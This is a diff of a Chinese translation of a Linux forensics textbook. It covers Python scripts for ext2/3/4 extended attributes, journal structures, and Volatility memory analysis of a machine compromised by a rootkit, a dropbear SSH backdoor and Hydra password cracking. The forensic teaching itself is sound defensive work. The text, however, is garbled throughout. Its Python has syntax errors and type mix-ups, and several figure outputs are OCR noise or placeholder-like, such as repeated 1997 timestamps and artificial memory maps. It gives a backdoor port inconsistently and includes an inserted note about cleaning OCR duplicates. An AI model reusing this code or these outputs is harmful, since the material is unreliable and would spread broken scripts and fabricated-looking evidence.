     data = str(f.read(emd.superblock.inodeSize))
@@ -6297,14 +7435,23 @@ data = ""
 for db in datblock:
     data += extfs.getBlock(sys.argv[1], long(sys.argv[2]), db,
     emd.superblock.blockSize)
-    dir = extfs.getDirectory(data)
-    for name in dir:
-        fname.prettyPrint(name)
+```
+
+
+
+```
+dir = extfs.getDirectory(data)
+
+for name in dir:
+
+    fname.prettyPrint(name)
+
 if __name__ == "__main__":
+
     main()
 ```
 
-针对 PFE 目标系统的根目录（inode 2）和 `/tmp` 目录运行新脚本的结果分别如图 7.24 和图 7.25 所示。我们注意到 "lost-found" 目录位于 inode 11 中，这是预期的位置。在图 7.25 中，高亮了两个与 rootkit 关联的文件。
+针对 PFE 目标系统的根目录（inode 2）和 `/tmp` 目录运行新脚本的结果分别如图 7.24 和图 7.25 所示。我们注意到 `lost-found` 目录位于 inode 11 中，这是预期的位置。在图 7.25 中，高亮了两个与 rootkit 关联的文件。
 
 ![](img/7abfab28a493757db3f096946a95ec01_288_0.png)
 
@@ -6312,9 +7459,9 @@ if __name__ == "__main__":
 针对 PFE 目标系统的根目录运行 `ils.py`。
 
 # 图 7.25
-针对 PFE 目标系统的 /tmp 目录运行 `ils.py`。
+针对 PFE 目标系统的 `/tmp` 目录运行 `ils.py`。
 
-### 扩展属性
+## 扩展属性
 
 扩展文件系统族支持扩展属性（extended attributes）。扩展属性首次用于用于访问控制列表（ACLs）。虽然现在扩展属性存储 ACLs 并不罕见，但只要属性名以“user.” 开头，就可以作为用户属性存储几乎任何内容。需要注意的是，在实现 ACLs 时，旧版本的内核要求使用正确的挂载选项。这就是在进行现场分析时捕获挂载信息的另一个原因。
 
@@ -6362,22 +7509,39 @@ if __name__ == "__main__":
 
 ```python
 printAttrPrefix
+
 def printAttrPrefix(index):
+
     if index == 0 or index > 8:
+
         return ""
+
     elif index == 1:
+
         return "user"
+
     elif index == 2:
+
         return "system.posix_acl_access"
+
     elif index == 3:
+
         return "system.posix_acl_default"
+
     elif index == 4:
+
         return "trusted."
+
     elif index == 6:
+
         return "security."
+
     elif index == 7:
+
         return "system."
+
     elif index == 8:
+
         return "system.richacl"
 ```
 
@@ -6385,13 +7549,21 @@ def printAttrPrefix(index):
 
 ```python
 class ExtAttrEntry():
+
     def __init__(self, data, offset=0):
+
         self.nameLen = getU8(data, offset + 0x0)
+
         self.nameIndex = getU8(data, offset + 0x1)
+
         self.valueOffset = getU16(data, offset + 0x2)
+
         self.valueBlock = getU32(data, offset + 0x4)
+
         self.valueSize = getU32(data, offset + 0x8)
+
         self.valueHash = getU32(data, offset + 0xc)
+
         self.name = printAttrPrefix(self.nameIndex) + \
             str(data[offset + 0x10: offset + 0x10 + self.nameLen])
 ```
@@ -6401,8 +7573,10 @@ class ExtAttrEntry():
 ```python
 def getAttrsFromBlock(imageFilename, offset, \
     blockNo, blockSize=4096):
+
     data = getDataBlock(imageFilename, offset, \
         blockNo, blockSize)
+
     return getExtAttrsHelper(False, imageFilename, \
     offset, data, blockSize)
 ```
@@ -6411,54 +7585,71 @@ def getAttrsFromBlock(imageFilename, offset, \
 
 ```python
 def getAttrsInInode(imageFilename, offset, data, blockSize=4096):
-    return getExtAttrsHelper(True, imageFilename, offset, data, blocksize)
-# 这是后续两个函数的辅助函数
-def getExtAttrsHelper(inInode, imageFilename, offset, data, blockSize=4096):
-    # 前四个字节是魔数
-    retVal = ()
-    if getU32(data, 0) != 0xEA020000:
-        return retVal
 
-    done = False
-    if inInode:
-        i = 4
-    else:
-        i = 32
-    while not done:
-        eae = ExtAttrEntry(data, i)
-        # 是否为扩展属性
-        if eae.nameLen == 0 and eae.nameIndex == 0 and eae.valueOffset == 0 \
-            and eae.valueBlock == 0:
-            done = True
-        else:
-            # 在 inode 内部还是外部块？
-            if eae.valueBlock == 0:
-                v = data[eae.valueOffset : eae.valueOffset + eae.valueSize]
-            else:
-                v = getDataBlock(imageFilename, offset, eae.valueBlock, \
-                    blockSize) : eae.valueOffset + eae.valueSize]
-            retVal[eae.name] = v
-        i += eae.nameLen + 12
-        if i >= len(data):
-            done = True
-    return retVal
+    return getExtAttrsHelper(True, imageFilename, offset, data, blocksize)
+
+# 这是后续两个函数的辅助函数
+
+def getExtAttrsHelper(inInode, imageFilename, offset, data, blockSize=4096):
+
+    # 前四个字节是魔数
+
+    retVal = ()
 ```
 
 
 
+```python
+if getU32(data, 0) != 0xEA020000:
+    return retVal
+
+done = False
+
+if inInode:
+    i = 4
+else:
+    i = 32
+
+while not done:
+    eae = ExtAttrEntry(data, i)
+
+    # 是否为扩展属性
+    if eae.nameLen == 0 and eae.nameIndex == 0 and eae.valueOffset == 0 \
+        and eae.valueBlock == 0:
+        done = True
+    else:
+        # 在 inode 内部还是外部块？
+        if eae.valueBlock == 0:
+            v = data[eae.valueOffset : eae.valueOffset + eae.valueSize]
+        else:
+            v = getDataBlock(imageFilename, offset, eae.valueBlock, \
+                blockSize) : eae.valueOffset + eae.valueSize]
+
+        retVal[eae.name] = v
+
+    i += eae.nameLen + 12
+    if i >= len(data):
+        done = True
+
+return retVal
+```
 
 以下脚本可用于镜像中 inode 的扩展属性（extended attributes）。我包含它主要是为了保持完整性。如果你挂载了该文件系统镜像，可以使用本节讨论的标准系统工具轻松地列出这些属性。
 
 ```python
 #!/usr/bin/python
+
 #
 ### getattr.py
 #
+
 # 这是一个简单的 Python 脚本，用于打印
 # 镜像文件中 ext2/3/4 文件系统内部的 inode 扩展属性。
 #
+
 ### 为 PentAcademy 开发
 ### 作者：Dr. Phil Polstra (@ppolstra)
+
 import extfs
 import sys
 import os.path
@@ -6475,16 +7666,21 @@ def usage():
 def main():
     if len(sys.argv) < 3:
         usage()
+
     # 读取第一个扇区
     if not os.path.isfile(sys.argv[1]):
         print("File " + sys.argv[1] + " cannot be opened for reading")
         exit(1)
+
     emd = extfs.ExtMetadata(sys.argv[1], sys.argv[2])
+
     # 获取 inode 位置
     inodeLoc = extfs.getInodeLoc(sys.argv[3], \
         emd.superblock.inodesPerGroup)
+
     offset = emd.bgbdList(inodeLoc[0]) * \
         emd.superblock.blockSize + inodeLoc[1] * emd.superblock.inodeSize
+
     with open(str(sys.argv[1]), 'rb') as f:
         f.seek(offset + int(sys.argv[2]) * 512)
         data = str(f.read(emd.superblock.inodeSize))
@@ -6492,6 +7688,7 @@ def main():
 
 ```python
 inode = extfs.inode(data, emd.superblock.inodeSize)
+
 if inode.hasExtendedAttributes:
     # 是在 inode 闲隙区域还是数据块中
     if inode.extendAttrib == 0:
@@ -6504,13 +7701,16 @@ if inode.hasExtendedAttributes:
             print("%s: %s" % (k, v))
 else:
     print('Inode %s has no extended attributes' %s % (sys.argv[3]))
+
 if __name__ == "__main__":
     main()
 ```
 
+
+
 ### 日志（JOURNALING）
 
-如前所述，日志（journal）用于增加文件系统处于一致状态的概率。在 Linux 中，大多数情况下日志行为是高度可配置的。默认情况下只通过日志写入元数据（而不是数据块）。这样做是为了性能考虑。可以通过挂载数据选项更改默认设置。`option=journal` 选项会导致所有数据块都通过日志写入。还有其他选项。详情请参见挂载页（mount page）。
+如前所述，日志（journal）用于增加文件系统处于一致状态的概率。在 Linux 中，大多数情况下日志行为是高度可配置的。默认情况下只通过日志写入元数据（而不是数据块）。这样做是为了性能考虑。可以通过挂载数据选项更改默认设置。`option=journal` 选项会导致所有数据块都通过日志写入。还有其他选项。详情请参见挂载页（`mount` page）。
 
 日志会导致数据写入两次。第一次数据以尽可能快的速度写入磁盘。为了实现这一点，日志存储在一个块组中，并且通常是该组中唯一存储的。这最小化减少了磁盘寻道时间。随后，在数据提交到日志后，操作系统会将数据写入磁盘上的正确位置，然后擦除提交记录。这不仅提高了数据完整性，还通过在写入磁盘之前缓存许多小写操作提升了性能。
 
@@ -6526,7 +7726,7 @@ if __name__ == "__main__":
 | 0x14 | be32 | s_first | 日志信息的第一个块。 |
 | 0x18 | be32 | s_sequence | 日志中预期的第一个提交 ID。 |
 | 0x1C | be32 | s_start | 日志开始的编号。 |
-| 0x20 | be32 | s_errno | 错误值，由 jbd2_journal_abort() 设置。 |
+| 0x20 | be32 | s_errno | 错误值，由 `jbd2_journal_abort()` 设置。 |
 | 0x24 | be32 | s_feature_compat | 兼容性特征。0x1 = 日志维护校验和 |
 | 0x28 | be32 | s_feature_incompat | 不兼容特征集。 |
 | 0x2C | be32 | s_feature_ro_compat | 只读兼容特征集。目前尚没有。 |
@@ -6540,37 +7740,40 @@ if __name__ == "__main__":
 | 0xFC | be32 | s_padding | 填充 |
 | 0x100 | u8 | s_users | 所有 ...的 ID |
 
-
-
-
-
 它应该与 Volatility 模块 `module.c` 和 `Makefile` 位于相同的目录下，这些文件可以在 volatility 层次结构下的 `tools/linux` 目录找到。脚本如下。
 
 ```bash
 #!/bin/bash
+
 ### create-profile.sh
+
 #
 # 用于为 Volatility profile 创建 makefile 的简单脚本。
 # 旨在配合镜像文件使用。
 # 由 PentesterAcademy 的
 # Phil Polstra 博士 (@ppolstra) 开发。
+
 usage() {
   echo "从挂载的镜像文件创建 Volatility profile 的脚本"
   echo "用法: $0 <镜像根目录路径>"
   exit 1
 }
+
 if [ $# -lt 1 ]; then
   usage
 fi
+
 oldir=${1}/boot
 cd ${oldir}
 nver=$(ls System.map* | sed "s/System.map//" | tr "\n" "\|" \
   | sed -nr 's/\([a-zA-Z0-9.\-]+\)\|([a-zA-Z0-9.\-]+\)\$/\2/p' \
   | sed "s/nn//"
 cd ${oldir}
+
 echo "Version: ${ver}"
 PWD=$(pwd)
 MAKE=$(which make)
+
 cat <<EOF Makefile.${ver}
 obj-m += module.o
 -include dwarf version.mk
@@ -6589,11 +7792,15 @@ EOF
 ```bash
 ### 创建 dwarf 文件
 make -f Makefile.${ver}
+
 ### 拷贝 System.map 文件
 cp ${1}/boot/System-map-${ver} ./
+
 ### 现在制作 zip 包
 zip Linux${ver}.zip module.dwarf System-map-${ver}
 ```
+
+
 
 让我们逐步分析这个脚本。它以 she-bang、用法说明开始，并在切换到目标对象的 `/boot` 目录之前，将命令行参数数量保存在 `oldir=$(pwd)` 行中。脚本的下部分尝试通过 `System.map` 文件名来修复正确的内核版本。由于可能安装了多个内核，这变得有些复杂。
 
@@ -6619,14 +7826,11 @@ zip Linux${ver}.zip module.dwarf System-map-${ver}
 
 一旦构建了 profile，...
 
-
-
-
 ### 图 8.4
 
 一些可 Volatility Linux 命令。
 
-Volatility 为 Linux 系统提供了许多进程命令。其中最简单的是 `linux_pslist`，它通过遍历任务列表生成任务列表。该命令输出进程名称、进程 ID (PID)、用户 ID (UID) 和组 ID (GID）（以及其他几个你可能不需要的字段）。在我们的 PFE 目标系统上运行此命令的部分输出如图 8.5 所示。高亮行显示了一个在进程 3027 中以 root 权限运行的与形意拳（Xing Yi Quan）rootkit 相关的 shell。
+Volatility 为 Linux 系统提供了许多进程命令。其中最简单的是 `linux_pslist`，它通过遍历任务列表生成任务列表。该命令输出进程名称、进程 ID (PID)、用户 ID (UID) 和组 ID (GID)（以及其他几个你可能不需要的字段）。在我们的 PFE 目标系统上运行此命令的部分输出如图 8.5 所示。高亮行显示了一个在进程 3027 中以 root 权限运行的与形意拳（Xing Yi Quan）rootkit 相关的 shell。
 
 ![](img/7abfab28a493757db3f096946a95ec01_305_0.png)
 
@@ -6648,7 +7852,7 @@ Volatility linux_pslist 命令的局部输出。高亮行显示了一个以管�
 
 在 PFE 目标系统上运行 Volatility linux_pstree 命令的局部结果。高亮输出显示了图 8.6 中高亮的进程之间的关系。
 
-- `-p` 选项，允许你提供一组逗号分隔的进程标识数字。要获取此或其他任何其他 Volatility 命令的帮助，请运行 `vol.py <command> -h` 查看简要帮助屏幕。图 8.8 显示了 `linux_psenv` 帮助界面的最后部分，以及与 rootkit 相关的进程上运行 `linux_psenv` 的结果。
+`-p` 选项，允许你提供一组逗号分隔的进程标识数字。要获取此或其他任何其他 Volatility 命令的帮助，请运行 `vol.py <command> -h` 查看简要帮助屏幕。图 8.8 显示了 `linux_psenv` 帮助界面的最后部分，以及与 rootkit 相关的进程上运行 `linux_psenv` 的结果。
 
 虽然 `linux_psaux` 命令很好且提供了很多信息，但还有另一个可以提供更多信息的命令。该命令是 `linux_psenv`。该命令列出了每个显示进程的完整进程环境。由于此命令会生成一个输出列表，你可能希望使用 -
 
@@ -6685,9 +7889,6 @@ Volatility 为进程提供了一个交叉引用（[cross-reference](https:cross-
 
 从 bash 进程内存检索 bash 历史的 Volatility 命令是 `linux_bash`。在 PFE 目标系统上运行此命令的部分输出显示了可疑活动，如图 8.12 和图 8.13 所示。发现了许多未显示的攻击者的其他操作。
 
-
-
-
 ### 图 8.12
 
 在 PFE 目标系统上运行 `linux_bash` 的部分结果。高亮部分显示了攻击者在移动虚造的 john 家目录后，尝试修改 `/etc/passwd` 文件。
@@ -6708,18 +7909,29 @@ Volatility 为进程提供了一个交叉引用（[cross-reference](https:cross-
 
 当命令在 bash shell 中首次运行时，bash 必须搜索 `user-> path` 路径（存储在 `PATH` 环境变量中）。因为这是一个耗时的过程，bash 将经常运行的命令存储在哈希表中，以减轻每次都要查找程序的需要。此哈希表可以使用 `hash` 命令进行查看、修改甚至清除。Volatility 提供了 `linux_bash_hash` 命令用于查看内存中每个 bash shell 的此哈希表。在 PFE 目标系统上运行此命令的结果如图 8.15 所示。
 
+
+
 ```
 volatility --framework 2.6 help
+
 volatility framework 2.6
+
 -f mem.py -profile linux_check linux_bash_hash
+
 -PFE
 
   -f mem.py
+
   -profile linux_check
+
   - 1
+
   - 1 Hour
+
   - 1 is
+
   - 1 is
+
   - 1 is
 ```
 
@@ -6731,28 +7943,41 @@ Volatility 包含了几个对各种形式的恶意软件进行检查的命令。
 
 ```
 phi1@laptop:~/PesterTestAcademy/linux_forensics$ vmpa linux apihooks
+
 Volatility Foundation Framework 2.4
+
 Pld     Name                Hook VMA             Hook Symbol          HOOKED
+
 Address Type            Hook Address         Hook Library         
+
       2219 conij           /usr/libx86_64.linux...=libGL.so.1.2.0 glEnable      0x0000007
+
 flaec523a77d 0x00000000 /usr/libx86_64.linux...=libGL.so.1.2.0 glInitWidth  0x0000007
+
       2219 conij           0x00000000 /usr/libx86_64.linux...=libGL.so.1.2.0 Disable      0x0000007
+
 flaec523a77d 0x00000000 /usr/libx86_64.linux...=libGL.so.1.2.0 glBoolean    0x0000007
+
       2219 conij           0x00000000 /usr/libframe.so.6.0.0 reject 0x0000007
+
 flaec0527d0 0x00000000 /usr/libx86_64.linux...=libframe.so.6.0.0 accept_touch 0x0000007
+
       2219 conij           0x00000000 <Unknown mapping>
+
 real 17:56.422
+
 user 16:42.067s
+
 sys  1m.058s
+
 phi1@laptop:~/PesterTestAcademy/linux_forensics$
 ```
+
+
 
 图 8.16 运行时间长的 Volatility 命令。该命令在运行近三个小时后被中断。
 
 （注：OCR文本存在大量重复，我已根据提供的文本结构进行了清理。）
-
-
-
 
 # Volatility 框架 Volatility 2 接口进程
 
@@ -6767,7 +7992,7 @@ phi1@laptop:~/PesterTestAcademy/linux_forensics$
 
 一旦确定了网络接口，你就查看目标机器上的开放端口。在 Linux 系统中，`netstat` 命令是许多可以报告此类信息的工具之一。Volatility 的 `linux_netstat` 命令提供了类似的信息。读者可能熟悉 TCP 和 UDP 套接字。有些人可能不熟悉 UNIX 套字，但 `netstat` 也会报告它们。UNIX 套字用于同一台机器上的进程间通信（IPC）。如果你观察典型的 Linux 系统，会发现有很多这样的套字正在被使用。在调查中不要忽略这些套字，因为它们可能被用于恶意软件组件之间的 IPC，或作为与合法系统进程交互的方式。
 
-由于 `linux_netstat` 命令返回了大量信息，你可能想将其与 `grep` 结合以区分不同的套字类型。运行 `linux_netstat` 命令并将结果通过到 `grep TCP` 的结果如图 8.20 所示。高亮行显示一个 rootkit shell 正在监听端口 7777。你还可以看到这台机器上运行着安全外壳（SSH）和文件传输协议（FTP）服务器。运行 FTP 服务器存在危险，其中一个事实是登录是不加密的，这会导致凭据被截获。针对 FTP 服务器的在线密码破解也比对 SSH 运行密码破解器快得多。这个 FTP 服务器很可能就是这次泄露的源头。
+由于 `linux_netstat` 命令返回了大量信息，你可能想将其与 `grep` 结合以区分不同的套字类型。运行 `linux_netstat` 命令并将结果通过到 `grep TCP` 的结果如图 8.20 所示。高亮行显示一个 rootkit shell 正在监听端口 `7777`。你还可以看到这台机器上运行着安全外壳（SSH）和文件传输协议（FTP）服务器。运行 FTP 服务器存在危险，其中一个事实是登录是不加密的，这会导致凭据被截获。针对 FTP 服务器的在线密码破解也比对 SSH 运行密码破解器快得多。这个 FTP 服务器很可能就是这次泄露的源头。
 
 ### 图 8.20
 
@@ -6801,7 +8026,7 @@ Linux 提供了一个广泛的系统，允许在网络流的各个点（如路�
 
 上一个相当冗长的章节讨论了文件系统。你可能会奇怪为什么使用内存分析工具来检查文件系统。这样做有几个原因。首先，了解哪些文件系统已被挂载是有帮助的。其次，现代 Linux 系统使用临时文件系统，这些文件系统在系统关闭时会消失。像 Volatility 这样的工具可能是恢复这些临时文件系统的唯一方法。
 
-Volatility `linux_mount` 命令列出所有挂载的文件系统，并带有挂载选项。此命令的结果允许你检测出额外挂载的内容，以及攻击者用新选项重新挂载的文件系统。对 PFE 目标系统运行此命令的部分结果如图 8.24 所示。图中可以看到用于加载 LiME 的响应驱动器的 FAT (/dev/sdb1) 和 ext4 (/dev/sdb2) 分区。
+Volatility `linux_mount` 命令列出所有挂载的文件系统，并带有挂载选项。此命令的结果允许你检测出额外挂载的内容，以及攻击者用新选项重新挂载的文件系统。对 PFE 目标系统运行此命令的部分结果如图 8.24 所示。图中可以看到用于加载 LiME 的响应驱动器的 FAT (`/dev/sdb1`) 和 ext4 (`/dev/sdb2`) 分区。
 
 | /etc/ssh/security | | connections | .relative |
 |---|---|---|---|
@@ -6821,43 +8046,16 @@ Volatility `linux_mount` 命令列出所有挂载的文件系统，并带有挂�
 
 ### 图 8.24
 
-意外的是，Linux 会缓存最近访问的文件。Volatility `linux_enumerate_files` 命令允许你获取缓存中的文件列表。这有助于你在执行文件系统分析时定位感兴趣的文件。如图 8.25 所示，用户 Downloads 文件夹中有许多与 root 关的文件。对于特定的目录，你可能想将结果管道到 `grep ^tmp/`。正则表达式中的 `^` 将搜索模式锚在行首，这消除了结果中出现搜索字符串的其他目录和文件。必须使用 egrep（扩展 grep）锚才能正常工作。管道命令 `^tmp/` 的结果如图 8.26 所示。注意这里有几个与 root 关的文件，包括 #65712、#65710 和 #65707，它们是 rootkit 文件的 inode 号。
+意外的是，Linux 会缓存最近访问的文件。Volatility `linux_enumerate_files` 命令允许你获取缓存中的文件列表。这有助于你在执行文件系统分析时定位感兴趣的文件。如图 8.25 所示，用户 Downloads 文件夹中有许多与 root 关的文件。对于特定的目录，你可能想将结果管道到 `grep ^tmp/`。正则表达式中的 `^` 将搜索模式锚在行首，这消除了结果中出现搜索字符串的其他目录和文件。必须使用 egrep（扩展 grep）锚才能正常工作。管道命令 `^tmp/` 的结果如图 8.26 所示。注意这里有几个与 root 关的文件，包括 `#65712`、`#65710` 和 `#65707`，它们是 rootkit 文件的 inode 号。
 
+```
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 pslist
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 pslist -v
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 pxlist
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 netlist
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 net_scan
 $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
-$ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
+```
 
 ### 图 8.25
 
@@ -6871,10 +8069,7 @@ $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
 
 一旦使用 `linux_enumerate_files` 发现了缓存中的文件，可以使用 Volatility `linux_find_file` 命令打印出 inode 信息。
 
-
-
-
-此命令也可用于提取文件。要获取 inode 信息，必须使用 `-F <完整路径>` 选项。遗憾的是，`-F` 选项似乎不支持 `wsel`。一旦找到 inode 和地址，就可以使用 `-i <inode 的地址> -O <输出文件>` 选项重新运行 `linux_find_file`。恢复 `/tmp/xingyi_bindshell_port` 文件的完整过程如图 8.27 所示。从图中我们可以看到该文件存储了值 7777，这与我们在本章网络部分之前的发现相对应。
+此命令也可用于提取文件。要获取 inode 信息，必须使用 `-F <完整路径>` 选项。遗憾的是，`-F` 选项似乎不支持 `wsel`。一旦找到 inode 和地址，就可以使用 `-i <inode 的地址> -O <输出文件>` 选项重新运行 `linux_find_file`。恢复 `/tmp/xingyi_bindshell_port` 文件的完整过程如图 8.27 所示。从图中我们可以看到该文件存储了值 `7777`，这与我们在本章网络部分之前的发现相对应。
 
 ![](img/7abfab28a493757db3f096946a95ec01_324_0.png)
 
@@ -6934,9 +8129,6 @@ $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
 
 在本章中，我们介绍了 Linux 系统应急响应中最常用的 Volatility 命令。我们看到，其中许多命令没有返回关于对 PFE 计算机攻击的额外信息。在下一章中，我们将讨论当攻击者使用更高级的技术时，情况会发生什么变化。
 
-
-
-
 ### 图 9.1
 
 在取证工作站上启动案件。
@@ -6947,19 +8139,19 @@ $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
 
 加载已知的良好二进制文件并对目标进行初始扫描。
 
-在检查由 `initial-scan.sh` 生成的日志文件后，很快发现某些不对劲。你首先注意到的事情之一是一个 shell 正在端口 44965 上监听，如图 9.3 所示。使用 `netcat`，你对该端口进行了快速的横幅抓取（banner grab），发现它报告自己为 SSH-2.0-WinSSHD，如图 9.4 所示。在进行一些研究后，你发现这是一个 dropbear SSH 后门。你尝试 SSH 连接到这台机器，这证实了你的怀疑（如图 9.4 所示）。
+在检查由 `initial-scan.sh` 生成的日志文件后，很快发现某些不对劲。你首先注意到的事情之一是一个 shell 正在端口 `44965` 上监听，如图 9.3 所示。使用 `netcat`，你对该端口进行了快速的横幅抓取（banner grab），发现它报告自己为 SSH-2.0-WinSSHD，如图 9.4 所示。在进行一些研究后，你发现这是一个 dropbear SSH 后门。你尝试 SSH 连接到这台机器，这证实了你的怀疑（如图 9.4 所示）。
 
 ![](img/7abfab28a493757db3f096946a95ec01_331_0.png)
 
 图 9.3
 
-初始扫描日志文件的一部分。高亮部分显示了一个正在端口 4465 上监听的 shell。
+初始扫描日志文件的一部分。高亮部分显示了一个正在端口 `4465` 上监听的 shell。
 
 ![](img/7abfab28a493757db3f096946a95ec01_331_1.png)
 
 图 9.4
 
-通过横幅抓取和 SSH 登录尝试证实了端口 4465 上存在 dropbear SSH 后门。
+通过横幅抓取和 SSH 登录尝试证实了端口 `4465` 上存在 dropbear SSH 后门。
 
 到目前为止，我们知道发生了一些事情，因为安装了一个后门。对失败的登录尝试进行检查显示，该用户在 5 月 3 日 23:07 通过 SSH 产生了一长串失败尝试列表。如图 9.5 所示。目前尚不清楚这些尝试发生在后门安装之前还是之后。
 
@@ -6973,27 +8165,49 @@ $ /usr/bin/volatility -f /tmp/mem.dmp --profile linux_v26_pre3_x86 -mod
 
 Web 服务器被攻破了。攻击者利用 Web 服务器的漏洞获取了未经授权的访问。一旦获得访问，他们安装了一个 rootkit 来隐藏自己的行踪。该 rootkit 允许他们在不被标准安全措施检测到的情况下继续从服务器外泄数据。
 
-```
+
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12 10:14:01
+
 Feb 1997-02-12
+
+```
 ```
 
 ### 9.6
@@ -7048,25 +8262,39 @@ Feb 1997-02-12
 
 ```
 cat /proc/9210/maps
+
 7f8a12345000-7f8a12351000 r-xp--00000000 08:01:5 0
+
 7f8a12351000-7f8a12352000 r-p--00000000 08:01:5 0
+
 7f8a12352000-7f8a12353000 r-wx--00000000 08:01:5 0
+
 7f8a12353000-7f8a12354000 r-s--00000000 08:01:5 0
+
 7f8a12354000-7f8a12355000 r-p--00000000 08:01:5 0
+
 7f8a12355000-7f8a12356000 r-p--00000000 08:01:5 0
+
 7f8a12356000-7f8a12357000 r-p--00000000 08:01:5 0
+
 7f8a12357000-7f8a12358000 r-p--00000000 08:01:5 0
+
 7f8a12358000-7f8a12359000 r-p--00000000 08:01:5 0
+
 7f8a12359000-7f8a1235a000 r-p--00000000 08:01:5 0
+
 7f8a1235a000-7f8a1235b000 r-p--00000000 08:01:5 0
+
 7f8a1235b000-7f8a1235c000 r-p--00000000 08:01:5 0
+
 7f8a1235c000-7f8a1235d000 r-p--00000000 08:01:5 0
+
 7f8a1235d000-7f8a1235e000 r-p--00000000 08:01:5 0
+
 7f8a1235e000-7f8a1235f000 r-p--00000000 08:01:5 0
+
 7f8a1235f000-7f8a12360000 r-p--00000000 08:01:5 0
 ```
-
-
 
 
 
@@ -7078,90 +8306,157 @@ cat /proc/9210/maps
 
 使用 Hydra 进行在线密码破解。
 
-攻击者对本地 FTP 服务器使用了 Hydra。在启动 Hydra 之前，攻击者复制了 `/etc/passwd` 和 `/etc/shadow` 文件。目前还不清楚为什么要使用 Hydra 而不是像 John the Ripper 这样的离线密码破解工具。也许攻击者不想拷贝 passwd 和 shadow 文件。使用本地 FTP 服务器进行密码破解速度较快，而且如果安装的入侵检测系统（IDS）没有配置为监控此类流量，则可能不会产生警报。
+攻击者对本地 FTP 服务器使用了 `Hydra`。在启动 `Hydra` 之前，攻击者复制了 `/etc/passwd` 和 `/etc/shadow` 文件。目前还不清楚为什么要使用 `Hydra` 而不是像 `John the Ripper` 这样的离线密码破解工具。也许攻击者不想拷贝 `passwd` 和 `shadow` 文件。使用本地 FTP 服务器进行密码破解速度较快，而且如果安装的入侵检测系统（IDS）没有配置为监控此类流量，则可能不会产生警报。
 
-命令 `linux_psenv` 针对进程 8540、1284 和 9210 运行产生了一些有趣的结果。其中部分结果如图 9.15 所示。高亮部分显示创建了一个隐藏目录 `/usr/mysql/hacked`。`dropbearer` 后门的进程环境证实了该程序在系统启动到级别 2 或更高级别时会自动启动。
+命令 `linux_psenv` 针对进程 `8540`、`1284` 和 `9210` 运行产生了一些有趣的结果。其中部分结果如图 9.15 所示。高亮部分显示创建了一个隐藏目录 `/usr/mysql/hacked`。`dropbearer` 后门的进程环境证实了该程序在系统启动到级别 2 或更高级别时会自动启动。
 
 ![](img/7abfab28a493757db3f096946a95ec01_340_0.png)
 
 图 9.15
 
